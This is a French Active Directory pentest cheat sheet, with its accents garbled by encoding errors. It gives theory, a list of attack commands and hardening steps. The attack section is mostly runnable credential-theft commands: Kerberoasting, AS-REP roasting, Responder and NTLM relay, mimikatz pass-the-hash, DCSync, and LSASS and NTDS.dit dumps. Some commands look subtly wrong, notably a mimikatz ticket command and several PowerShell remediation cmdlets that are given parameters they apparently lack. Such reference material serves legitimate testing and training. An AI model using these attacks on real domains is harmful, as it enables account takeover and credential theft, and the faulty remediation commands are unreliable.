# ğŸ•µï¸â€â™‚ï¸ THÃ‰ORIE, EXPLOITATION & REMÃ‰DIATION

### **ğŸ“Œ 1. THÃ‰ORIE : COMPRENDRE AD**

#### **ğŸ”¹ Structure dâ€™Active Directory**

ğŸ”‘ **Composants clÃ©s** :

* **Domain Controller (DC)** : Serveur qui gÃ¨re l'authentification et les GPOs
* **Group Policy Objects (GPOs)** : RÃ¨gles appliquÃ©es aux machines/utilisateurs
* **Security Identifier (SID)** : Identifiant unique des utilisateurs/groupes
* **Access Control List (ACL)** : DÃ©finit qui peut accÃ©der/modifier des objets

ğŸ”‘ **Comptes & groupes sensibles** :

* **Administrateur du domaine (DA)** â†’ Full contrÃ´le
* **Enterprise Admins** â†’ Admins multi-domaines
* **Domain Users** â†’ Tous les utilisateurs du domaine
* **KRBTGT** â†’ ClÃ© maÃ®tresse de Kerberos

#### **ğŸ”¹ Authentification & Kerberos**

ğŸ“Œ **NTLM vs Kerberos**

| MÃ©thode      | Fonctionnement     | Failles                        |
| ------------ | ------------------ | ------------------------------ |
| **NTLM**     | Challenge-Response | Relay attack, Pass-the-Hash    |
| **Kerberos** | Tickets (TGT, TGS) | Kerberoasting, Pass-the-Ticket |

ğŸ“Œ **Processus d'authentification Kerberos**

1. Client demande un Ticket Granting Ticket (**AS-REQ**)
2. DC envoie le TGT chiffrÃ© (**AS-REP**)
3. Client demande un accÃ¨s Ã  une ressource avec son TGT (**TGS-REQ**)
4. DC valide et dÃ©livre un Service Ticket (**TGS-REP**)

***

### **ğŸ”¥ 2. EXPLOITATION : ATTAQUES COURANTES SUR AD**

#### **ğŸ”¹ EnumÃ©ration (Recon AD)**

ğŸ“Œ **Sans compte :**

* ğŸ” `nmap -p 88,389,445 <IP>` â†’ VÃ©rifier services ouverts
* ğŸ” `crackmapexec smb <IP> --shares` â†’ Partages accessibles
* ğŸ” `ldapsearch -x -h <IP> -b "DC=domain,DC=com"` â†’ EnumÃ©ration LDAP

ğŸ“Œ **Avec compte :**

* ğŸ” `bloodhound-python -u user -p pass -d domain -c All`
* ğŸ” `net user /domain` â†’ Liste des utilisateurs
* ğŸ” `net group "Domain Admins" /domain` â†’ VÃ©rifier les admins

***

#### **ğŸ”¹ Attaques Kerberos**

ğŸ”‘ **Kerberoasting** (RÃ©cupÃ©rer des mots de passe chiffrÃ©s dans Kerberos)

```powershell
GetUserSPNs.py -dc-ip <DC-IP> domain/user:password -request
```

ğŸ”¥ **Cracking du hash**

```bash
hashcat -m 13100 hash.txt rockyou.txt
```

ğŸ”‘ **ASREPRoasting** (RÃ©cupÃ©rer les TGT dâ€™utilisateurs sans pre-auth)

```powershell
GetNPUsers.py domain/user -dc-ip <DC-IP> -no-pass
```

ğŸ”‘ **Pass-the-Ticket (PTT)** (RÃ©utilisation de tickets Kerberos)

```powershell
mimikatz "kerberos::ptc ticket.kirbi"
```

***

#### **ğŸ”¹ NTLM Relay & LLMNR Poisoning**

ğŸ”‘ **Capturer les requÃªtes LLMNR/NBT-NS & NTLMv2**

```bash
responder -I eth0
```

ğŸ”‘ **NTLM Relay Attack (SMB)**

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

ğŸ”‘ **Pass-the-Hash (PTH)**

```bash
mimikatz "sekurlsa::pth /user:Admin /domain:corp.local /ntlm:<hash>"
```

***

#### **ğŸ”¹ Exploitation ACLs & Privilege Escalation**

ğŸ”‘ **EnumÃ©rer les permissions dangereuses (BloodHound)**

* **GenericAll** : Full contrÃ´le sur un objet
* **GenericWrite** : Peut modifier un utilisateur (ex: changer son mot de passe)
* **WriteDACL** : Peut modifier les permissions dâ€™un objet

ğŸ”‘ **Exploiter un contrÃ´le sur un utilisateur (GenericWrite/GenericAll)**

```powershell
Add-DomainObjectAcl -TargetIdentity "Admin" -PrincipalIdentity "User"
```

ğŸ”‘ **DCSync Attack (Dump des hashes sans Ãªtre DA)**

```powershell
mimikatz "lsadump::dcsync /user:Administrator"
```

***

#### **ğŸ”¹ Dumping Credentials (Hash & MDP)**

ğŸ”‘ **Dump NTDS.DIT (Base AD)**

```powershell
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

ğŸ”‘ **Dump des credentials avec Mimikatz**

```powershell
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```

***

### **ğŸ›¡ï¸ 3. REMÃ‰DIATION & PROTECTIONS AD**

#### **ğŸ”¹ Protection contre Kerberoasting & ASREPRoasting**

âœ… **DÃ©sactiver la rÃ©cupÃ©ration de ticket sans pre-auth**

```powershell
Set-ADUser -Identity user -DoesNotRequirePreAuth $false
```

âœ… **DÃ©sactiver lâ€™accÃ¨s Ã  lâ€™authentification Kerberos des comptes non nÃ©cessaires**

```powershell
Set-ADAccountControl -KerberosEncryptionType None -Identity User
```

âœ… **Activer AES pour les tickets Kerberos**

```powershell
Set-ADUser -Identity user -KerberosEncryptionType AES256
```

***

#### **ğŸ”¹ Protection contre NTLM Relay & LLMNR Poisoning**

âœ… **DÃ©sactiver LLMNR/NBT-NS**

```powershell
Set-DnsClientGlobalSetting -EnableMulticast 0
```

âœ… **DÃ©sactiver NTLM si possible**

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictNTLM" -Value 2
```

âœ… **Signer les sessions SMB pour empÃªcher NTLM Relay**

```powershell
Set-SmbServerConfiguration -EnableSecuritySignature $true
```

***

#### **ğŸ”¹ SÃ©curisation des ACLs et Privilege Escalation**

âœ… **Auditer les permissions avec BloodHound**\
âœ… **Ã‰viter GenericAll, GenericWrite sur des comptes sensibles**\
âœ… **Activer la surveillance des modifications dâ€™ACL**

```powershell
Auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

***

#### **ğŸ”¹ Protection contre le Dumping des Credentials**

âœ… **Restreindre lâ€™accÃ¨s Ã  LSASS**

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -PropertyType DWord
```

âœ… **Activer Credential Guard sur les postes**

